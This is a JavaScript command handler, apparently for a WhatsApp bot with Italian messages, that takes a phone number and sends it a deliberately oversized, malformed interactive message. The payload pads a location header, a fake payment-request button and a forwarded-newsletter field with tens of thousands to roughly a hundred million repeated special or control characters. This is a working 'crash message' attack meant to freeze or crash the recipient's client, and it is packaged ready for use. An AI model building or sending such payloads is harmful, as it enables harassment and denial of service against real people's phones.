const handler = async (m, { conn, args, command }) => {
  if (!args[0]) return m.reply('⚠️ Inserisci un numero.\nEsempio: .forcenative 393333333333');

  let number = args[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net';

  const messagePayload = {
    message: {
      interactiveMessage: {
        header: {
          locationMessage: {
            degreesLatitude: 0,
            degreesLongitude: 0,
            name: "(🐉) jawaright -#FanChous5 Right neverside",
            url: "https://null.go.id",
            jpegThumbnail: "",
          },
          hasMediaAttachment: true,
        },
        body: {
          text: "(🐉) jawaright -#FanChous5 Right neverside" + "ꦾ".repeat(81000),
        },
        nativeFlowMessage: {
          buttons: [
            {
              name: "review_and_pay",
              buttonParamsJson: JSON.stringify({
                currency: "IDR",
                total_amount: { value: 666666, offset: 100 },
                reference_id: "4Q79X9PCBEM",
                type: "physical-goods",
                order: {
                  status: "completed",
                  subtotal: { value: 0, offset: 100 },
                  order_type: "PAYMENT_REQUEST",
                  items: [
                    {
                      retailer_id:
                        "custom-item-7fca9870-8e3a-4a4a-bfb7-8a07fbf5fa9e",
                      name: "\u0001".repeat(50600),
                      amount: { value: 666666, offset: 100 },
                      quantity: 1,
                    },
                  ],
                },
                additional_note: "jawaright The Executor",
                native_payment_methods: [],
                share_payment_status: true,
              }),
            },
          ],
        },
        contextInfo: {
          forwardingScore: 192,
          forwardedNewsletterMessageInfo: {
            newsletterJid: "9333333333333333@newsletter",
            newsletterName: "\ua991".repeat(99999991),
          },
          remoteJid: number,
          participant: number,
          mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
          groupMentions: [
            {
              groupJid: "1@newsletter",
              groupSubject: "TMAXSENTRY",
            },
          ],
          isForwarded: true,
          quotedMessage: {},
        },
      },
    },
  };

  try {
    await conn.relayMessage(number, messagePayload, { messageId: undefined });
    m.reply(`✅ Messaggio nativo inviato a ${args[0]}`);
  } catch (e) {
    m.reply('❌ Errore durante l\'invio del messaggio. Verifica che il numero sia corretto e che il bot non sia bloccato.');
  }
};

handler.command = /^forcenative$/i;
handler.owner = true; 
handler.group = false;

export default handler;